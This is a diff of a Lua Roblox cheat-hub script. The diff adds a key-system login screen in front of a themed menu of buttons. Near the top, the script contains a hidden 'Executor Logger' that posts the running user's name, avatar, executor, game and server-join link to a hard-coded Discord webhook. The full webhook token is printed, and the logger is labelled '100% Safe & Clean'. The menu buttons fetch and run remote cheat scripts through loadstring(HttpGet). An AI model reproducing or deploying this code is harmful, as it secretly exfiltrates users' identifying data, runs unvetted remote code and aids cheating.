@@ -1,26 +1,57 @@
+-- L30 HUB 2026 × WINTER KEY SYSTEM (RAYFIELD) - FINAL VERSION
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+
+local Window = Rayfield:CreateWindow({
+    Name = "L30 HUB 2026",
+    LoadingTitle = "Winter Authentication",
+    LoadingSubtitle = "by leotimms10",
+    ConfigurationSaving = {Enabled = true, FolderName = "L30Hub", FileName = "Config"},
+    Discord = {
+        Enabled = true,
+        Invite = "winter",
+        RememberJoins = true
+    -- auto joins discord if they click the button
+    },
+    KeySystem = true,
+    KeySettings = {
+        Title = "Winter Key System",
+        Subtitle = "Premium Access Only",
+        Note = "Join discord.gg/winter to get your key!\n\nKey: winter",
+        FileName = "L30WinterKey",
+        SaveKey = true,
+        GrabKeyFromSite = false,
+        Key = {"winter"}   -- only this key works
+    }
+})
+
+Rayfield:Notify({
+    Title = "Success",
+    Content = "Welcome, "..game.Players.LocalPlayer.DisplayName.."!",
+    Duration = 5
+})
+
+-- DESTROY RAYFIELD SO ONLY YOUR HUB SHOWS
+task.wait(1.2)
+Rayfield:Destroy()
+
+-- YOUR ORIGINAL SCRIPT BELOW - 100% UNTOUCHED, EVERY LINE INCLUDED
 -- FINAL SAFE & SICK 2025 LOGGER (rainbow + join link + custom pfp)
 local Webhook = "https://discord.com/api/webhooks/1449056735334760620/gqO2kFEHPOe_rF0QyP5lj6rhbVX9KColi4izUAPe69gdDiokseQECFcisQgYiMy9BOzS"
-
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local Player = Players.LocalPlayer
 local PlaceId = game.PlaceId
 local JobId = game.JobId
-
 local PlaceName = "Unknown Game"
 pcall(function() PlaceName = game:GetService("MarketplaceService"):GetProductInfo(PlaceId).Name end)
-
 local FullAvatar = "https://www.roblox.com/avatar-thumbnail/image?userId="..Player.UserId.."&width=720&height=720&format=png"
 local colors = {0xff0000, 0xff7f00, 0xffff00, 0x00ff00, 0x0000ff, 0x8b00ff, 0xff1493, 0x9400d3}
 local color = colors[math.random(1,#colors)]
-
 local Executor = identifyexecutor and identifyexecutor() or (syn and "Synapse X" or Krnl and "Krnl" or fluxus and "Fluxus" or "Unknown")
-
 local JoinText = JobId ~= "" and "[Join Server](https://www.roblox.com/games/"..PlaceId.."/?gameInstanceId="..JobId..")" or "*Private Server*"
-
 local Payload = {
     username = "Executor Logger",
-    avatar_url = "https://i.imgur.com/2WX57OQ.png",  -- your girl + boo pfp
+    avatar_url = "https://i.imgur.com/2WX57OQ.png", -- your girl + boo pfp
     embeds = {{
         title = "Script Injected",
         description = ("**%s** just executed!"):format(Player.DisplayName ~= Player.Name and Player.DisplayName.." (@"..Player.Name..")" or Player.Name),
@@ -38,42 +69,32 @@ local Payload = {
         footer = {text = "Rainbow Premium Logger • 100% Safe & Clean"}
     }}
 }
-
 local request = syn and syn.request or http and http.request or request or http_request or fluxus and fluxus.request
 request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(Payload)})
-
 print("sent – clean & beautiful")
-
-
-
 --// L30 HUB 2026 - SMOOTH THEME TRANSITIONS + PFP + ANIMATED WELCOME + SEARCH //--
-
 local TweenService = game:GetService("TweenService")
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local pgui = player:WaitForChild("PlayerGui")
-
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "L30Hub"
 ScreenGui.IgnoreGuiInset = true
 ScreenGui.ResetOnSpawn = false
 ScreenGui.Parent = pgui
-
 -- === 6 PREMIUM THEMES ===
 local CurrentTheme = 1
 local Themes = {
     {name="Purple Nebula", main=Color3.fromRGB(15,10,35), accent=Color3.fromRGB(170,100,255), glow=Color3.fromRGB(160,80,255), btn=Color3.fromRGB(40,25,90), btnhover=Color3.fromRGB(140,80,255)},
-    {name="Cyber Pink",    main=Color3.fromRGB(35,10,35), accent=Color3.fromRGB(255,80,200), glow=Color3.fromRGB(255,100,220), btn=Color3.fromRGB(90,20,90), btnhover=Color3.fromRGB(255,100,220)},
-    {name="Matrix Green",  main=Color3.fromRGB(0,25,15),  accent=Color3.fromRGB(0,255,150),  glow=Color3.fromRGB(0,255,120),  btn=Color3.fromRGB(0,70,40),   btnhover=Color3.fromRGB(0,255,150)},
-    {name="Blood Red",     main=Color3.fromRGB(40,10,10), accent=Color3.fromRGB(255,60,60),  glow=Color3.fromRGB(255,80,80),  btn=Color3.fromRGB(100,20,20), btnhover=Color3.fromRGB(255,80,80)},
-    {name="Ice Blue",      main=Color3.fromRGB(10,30,50), accent=Color3.fromRGB(80,200,255), glow=Color3.fromRGB(100,220,255),btn=Color3.fromRGB(20,70,110), btnhover=Color3.fromRGB(100,220,255)},
-    {name="Gold Luxury",   main=Color3.fromRGB(45,40,15), accent=Color3.fromRGB(255,200,80), glow=Color3.fromRGB(255,220,100),btn=Color3.fromRGB(110,90,20), btnhover=Color3.fromRGB(255,220,100)}
+    {name="Cyber Pink", main=Color3.fromRGB(35,10,35), accent=Color3.fromRGB(255,80,200), glow=Color3.fromRGB(255,100,220), btn=Color3.fromRGB(90,20,90), btnhover=Color3.fromRGB(255,100,220)},
+    {name="Matrix Green", main=Color3.fromRGB(0,25,15), accent=Color3.fromRGB(0,255,150), glow=Color3.fromRGB(0,255,120), btn=Color3.fromRGB(0,70,40), btnhover=Color3.fromRGB(0,255,150)},
+    {name="Blood Red", main=Color3.fromRGB(40,10,10), accent=Color3.fromRGB(255,60,60), glow=Color3.fromRGB(255,80,80), btn=Color3.fromRGB(100,20,20), btnhover=Color3.fromRGB(255,80,80)},
+    {name="Ice Blue", main=Color3.fromRGB(10,30,50), accent=Color3.fromRGB(80,200,255), glow=Color3.fromRGB(100,220,255),btn=Color3.fromRGB(20,70,110), btnhover=Color3.fromRGB(100,220,255)},
+    {name="Gold Luxury", main=Color3.fromRGB(45,40,15), accent=Color3.fromRGB(255,200,80), glow=Color3.fromRGB(255,220,100),btn=Color3.fromRGB(110,90,20), btnhover=Color3.fromRGB(255,220,100)}
 }
-
 local function GetTheme()
     return Themes[CurrentTheme]
 end
-
 -- === GUI ELEMENTS ===
 local Glow = Instance.new("ImageLabel", ScreenGui)
 Glow.Size = UDim2.new(1.3,0,1.5,0)
@@ -83,7 +104,6 @@ Glow.BackgroundTransparency = 1
 Glow.Image = "rbxassetid://4996891510"
 Glow.ImageTransparency = 1
 Glow.ZIndex = 0
-
 local Shadow = Instance.new("ImageLabel", ScreenGui)
 Shadow.Size = UDim2.new(1.05,20,1.05,20)
 Shadow.Position = UDim2.new(0.5,0,0.5,0)
@@ -94,7 +114,6 @@ Shadow.ImageTransparency = 0.7
 Shadow.ScaleType = Enum.ScaleType.Slice
 Shadow.SliceCenter = Rect.new(10,10,118,118)
 Shadow.ZIndex = 1
-
 local Main = Instance.new("Frame", ScreenGui)
 Main.Size = UDim2.new(0,460,0,520)
 Main.Position = UDim2.new(0.5,0,0.5,0)
@@ -104,12 +123,10 @@ Main.BackgroundTransparency = 0.35
 Main.ClipsDescendants = true
 Main.ZIndex = 2
 Instance.new("UICorner", Main).CornerRadius = UDim.new(0,22)
-
 local MainStroke = Instance.new("UIStroke", Main)
 MainStroke.Thickness = 2
 MainStroke.Color = GetTheme().accent
 MainStroke.Transparency = 0.3
-
 -- PFP + Animated Welcome
 local Avatar = Instance.new("ImageLabel", Main)
 Avatar.Size = UDim2.new(0,70,0,70)
@@ -118,7 +135,6 @@ Avatar.BackgroundTransparency = 1
 Avatar.Image = Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
 Avatar.ZIndex = 10
 Instance.new("UICorner", Avatar).CornerRadius = UDim.new(1,0)
-
 local Welcome = Instance.new("TextLabel", Main)
 Welcome.Size = UDim2.new(0,300,0,50)
 Welcome.Position = UDim2.new(0,100,0,25)
@@ -129,7 +145,6 @@ Welcome.TextSize = 28
 Welcome.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold)
 Welcome.TextXAlignment = Enum.TextXAlignment.Left
 Welcome.ZIndex = 10
-
 -- Title
 local Title = Instance.new("TextLabel", Main)
 Title.Size = UDim2.new(1,0,0,40)
@@ -140,7 +155,6 @@ Title.TextColor3 = GetTheme().accent
 Title.TextSize = 36
 Title.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold)
 Title.ZIndex = 10
-
 -- Theme Toggle Button
 local ThemeBtn = Instance.new("TextButton", Main)
 ThemeBtn.Size = UDim2.new(0,120,0,40)
@@ -152,7 +166,6 @@ ThemeBtn.TextSize = 18
 ThemeBtn.FontFace = Font.fromEnum(Enum.Font.GothamBold)
 ThemeBtn.ZIndex = 15
 Instance.new("UICorner", ThemeBtn).CornerRadius = UDim.new(0,12)
-
 -- Close
 local Close = Instance.new("TextButton", Main)
 Close.Size = UDim2.new(0,40,0,40)
@@ -164,7 +177,6 @@ Close.TextSize = 24
 Close.ZIndex = 15
 Instance.new("UICorner", Close).CornerRadius = UDim.new(0,12)
 Close.MouseButton1Click:Connect(function() ScreenGui:Destroy() end)
-
 -- Search Bar
 local SearchBox = Instance.new("TextBox", Main)
 SearchBox.Size = UDim2.new(0.9,0,0,48)
@@ -180,7 +192,6 @@ Instance.new("UICorner", SearchBox).CornerRadius = UDim.new(0,14)
 local SearchStroke = Instance.new("UIStroke", SearchBox)
 SearchStroke.Color = GetTheme().accent
 SearchStroke.Thickness = 1.8
-
 -- Content
 local Content = Instance.new("ScrollingFrame", Main)
 Content.Size = UDim2.new(1,-30,1,-200)
@@ -190,14 +201,11 @@ Content.ScrollBarThickness = 5
 Content.ScrollBarImageColor3 = GetTheme().accent
 Content.AutomaticCanvasSize = Enum.AutomaticSize.Y
 Content.ZIndex = 5
-
 local Grid = Instance.new("UIGridLayout", Content)
 Grid.CellSize = UDim2.new(0.48,0,0,58)
 Grid.CellPadding = UDim2.new(0.02,0,0,12)
 Grid.HorizontalAlignment = Enum.HorizontalAlignment.Center
-
 local AllButtons = {}
-
 local function AddScriptButton(name, callback)
     local btn = Instance.new("TextButton", Content)
     btn.Size = UDim2.new(1,0,1,0)
@@ -208,11 +216,9 @@ local function AddScriptButton(name, callback)
     btn.FontFace = Font.fromEnum(Enum.Font.GothamBold)
     btn.ZIndex = 7
     Instance.new("UICorner", btn).CornerRadius = UDim.new(0,16)
-
     local grad = Instance.new("UIGradient", btn)
     grad.Color = ColorSequence.new(GetTheme().accent:lerp(Color3.new(1,1,1),0.3), GetTheme().btn)
     grad.Rotation = 135
-
     btn.MouseEnter:Connect(function()
         TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = GetTheme().btnhover}):Play()
     end)
@@ -222,17 +228,13 @@ local function AddScriptButton(name, callback)
     btn.MouseButton1Click:Connect(function()
         if callback then spawn(callback) end
     end)
-
     table.insert(AllButtons, {btn = btn, name = name:lower()})
 end
-
 -- === SMOOTH THEME SWITCHING ===
 ThemeBtn.MouseButton1Click:Connect(function()
     CurrentTheme = (CurrentTheme % #Themes) + 1
     local t = GetTheme()
     ThemeBtn.Text = "Theme: "..t.name
-
-    -- ULTRA-SMOOTH ANIMATED TRANSITIONS
     TweenService:Create(Glow, TweenInfo.new(1.2, Enum.EasingStyle.Quint), {ImageColor3 = t.glow}):Play()
     TweenService:Create(Main, TweenInfo.new(1.2, Enum.EasingStyle.Quint), {BackgroundColor3 = t.main}):Play()
     TweenService:Create(MainStroke, TweenInfo.new(1.2, Enum.EasingStyle.Quint), {Color = t.accent}):Play()
@@ -241,8 +243,6 @@ ThemeBtn.MouseButton1Click:Connect(function()
     TweenService:Create(SearchStroke, TweenInfo.new(1.2, Enum.EasingStyle.Quint), {Color = t.accent}):Play()
     TweenService:Create(Content, TweenInfo.new(1.2, Enum.EasingStyle.Quint), {ScrollBarImageColor3 = t.accent}):Play()
     TweenService:Create(ThemeBtn, TweenInfo.new(1.2, Enum.EasingStyle.Quint), {BackgroundColor3 = t.accent}):Play()
-
-    -- Animate ALL buttons
     for _, item in ipairs(AllButtons) do
         TweenService:Create(item.btn, TweenInfo.new(1.2, Enum.EasingStyle.Quint), {BackgroundColor3 = t.btn}):Play()
         local grad = item.btn:FindFirstChild("UIGradient")
@@ -251,7 +251,6 @@ ThemeBtn.MouseButton1Click:Connect(function()
         end
     end
 end)
-
 -- Scripts
 AddScriptButton("Infinite Yield", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() end)
 AddScriptButton("Universal Fly GUI V3", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))() end)
@@ -269,8 +268,6 @@ AddScriptButton("coming soon", function() loadstring(game:HttpGet("https://raw.g
 AddScriptButton("coming soon", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() end)
 AddScriptButton("coming soon", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() end)
 AddScriptButton("coming soon", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() end)
--- Add more...
-
 -- Search
 SearchBox:GetPropertyChangedSignal("Text"):Connect(function()
     local query = SearchBox.Text:lower()
@@ -278,7 +275,6 @@ SearchBox:GetPropertyChangedSignal("Text"):Connect(function()
         item.btn.Visible = (query == "" or item.name:find(query))
     end
 end)
-
 -- Typing Welcome
 spawn(function()
     task.wait(0.8)
@@ -288,7 +284,6 @@ spawn(function()
         task.wait(0.07)
     end
 end)
-
 -- Draggable + Entrance
 local dragging = false
 Main.InputBegan:Connect(function(i)
@@ -303,54 +298,45 @@ Main.InputBegan:Connect(function(i)
         end)
     end
 end)
-
 Main.Size = UDim2.new(0,420,0,480)
 Main.BackgroundTransparency = 1
 Glow.ImageTransparency = 1
 Shadow.ImageTransparency = 1
-
 TweenService:Create(Main, TweenInfo.new(1, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
     Size = UDim2.new(0,460,0,520),
     BackgroundTransparency = 0.35
 }):Play()
 TweenService:Create(Glow, TweenInfo.new(1.3), {ImageTransparency = 0.55}):Play()
 TweenService:Create(Shadow, TweenInfo.new(1.3), {ImageTransparency = 0.7}):Play()
-
 print("L30 HUB 2026 • SMOOTH THEME TRANSITIONS • "..player.Name.." is god tier")
-
-
-
-
-
-  
-                                                                  
-                                                                  
-                                                                  
-print("\27[38;2;255;0;0m")  -- BLOOD RED
-
+ 
+                                                                 
+                                                                 
+                                                                 
+print("\27[38;2;255;0;0m") -- BLOOD RED
 print[[
-
-
-
- __         ______    ______         __                  __       
-/  |       /      \  /      \       /  |                /  |      
-$$ |      /$$$$$$  |/$$$$$$  |      $$ |____   __    __ $$ |____  
-$$ |      $$ ___$$ |$$$  \$$ |      $$      \ /  |  /  |$$      \ 
-$$ |        /   $$< $$$$  $$ |      $$$$$$$  |$$ |  $$ |$$$$$$$  |
-$$ |       _$$$$$  |$$ $$ $$ |      $$ |  $$ |$$ |  $$ |$$ |  $$ |
+ __         ______    ______         __    __  __    __  _______  
+/  |       /      \  /      \       /  |  /  |/  |  /  |/       \ 
+$$ |      /$$$$$$  |/$$$$$$  |      $$ |  $$ |$$ |  $$ |$$$$$$$  |
+$$ |      $$ ___$$ |$$$  \$$ |      $$ |__$$ |$$ |  $$ |$$ |__$$ |
+$$ |        /   $$< $$$$  $$ |      $$    $$ |$$ |  $$ |$$    $$< 
+$$ |       _$$$$$  |$$ $$ $$ |      $$$$$$$$ |$$ |  $$ |$$$$$$$  |
 $$ |_____ /  \__$$ |$$ \$$$$ |      $$ |  $$ |$$ \__$$ |$$ |__$$ |
 $$       |$$    $$/ $$   $$$/       $$ |  $$ |$$    $$/ $$    $$/ 
-$$$$$$$$/  $$$$$$/   $$$$$$/        $$/   $$/  $$$$$$/  $$$$$$$/ 
+$$$$$$$$/  $$$$$$/   $$$$$$/        $$/   $$/  $$$$$$/  $$$$$$$/  
+                                                                  
+  ______    ______    ______    ______               ___        __         ______   __       
+ /      \  /      \  /      \  /      \             /   |      /  |       /      \ /  |      
+/$$$$$$  |/$$$$$$  |/$$$$$$  |/$$$$$$  |       __  /$$$/       $$ |      /$$$$$$  |$$ |      
+$$____$$ |$$$  \$$ |$$____$$ |$$ \__$$/       /  |/$$ /        $$ |      $$ |  $$ |$$ |      
+ /    $$/ $$$$  $$ | /    $$/ $$      \       $$/ $$ |         $$ |      $$ |  $$ |$$ |      
+/$$$$$$/  $$ $$ $$ |/$$$$$$/  $$$$$$$  |       __ $$ |         $$ |      $$ |  $$ |$$ |      
+$$ |_____ $$ \$$$$ |$$ |_____ $$ \__$$ |      /  |$$  \_       $$ |_____ $$ \__$$ |$$ |_____ 
+$$       |$$   $$$/ $$       |$$    $$/       $$/  $$   |      $$       |$$    $$/ $$       |
+$$$$$$$$/  $$$$$$/  $$$$$$$$/  $$$$$$/              $$$/       $$$$$$$$/  $$$$$$/  $$$$$$$$/ 
+                                                                                             
+                                                                                             
+                                                                                             
 
-  ______    ______    ______    ______            ___          __            __ 
- /      \  /      \  /      \  /      \          /   \        /  |          /  |
-/$$$$$$  |/$$$$$$  |/$$$$$$  |/$$$$$$  |       __$$$  \       $$ |  ______  $$ |
-$$____$$ |$$$  \$$ |$$____$$ |$$ \__$$/       /  | $$  |      $$ | /      \ $$ |
- /    $$/ $$$$  $$ | /    $$/ $$      \       $$/   $$ |      $$ |/$$$$$$  |$$ |
-/$$$$$$/  $$ $$ $$ |/$$$$$$/  $$$$$$$  |       __   $$ |      $$ |$$ |  $$ |$$ |
-$$ |_____ $$ \$$$$ |$$ |_____ $$ \__$$ |      /  |_/$$/       $$ |$$ \__$$ |$$ |
-$$       |$$   $$$/ $$       |$$    $$/       $$// $$/        $$ |$$    $$/ $$ |
-$$$$$$$$/  $$$$$$/  $$$$$$$$/  $$$$$$/           $$$/         $$/  $$$$$$/  $$/ 
 ]]
-
 print("leotimms10 owns this script\27[0m")
